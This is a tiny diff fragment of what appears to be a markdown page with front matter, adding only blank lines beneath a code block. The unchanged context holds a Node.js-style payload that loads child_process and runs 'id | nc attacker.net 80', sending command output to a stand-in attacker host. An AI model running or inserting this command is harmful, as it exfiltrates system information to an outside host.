@@ -23,3 +23,5 @@ updated_at: '2023-04-10T20:23:52.301947+00:00'
 - x = x('child_process')
 = x.exec('id | nc attacker.net 80')
 ```
+
+
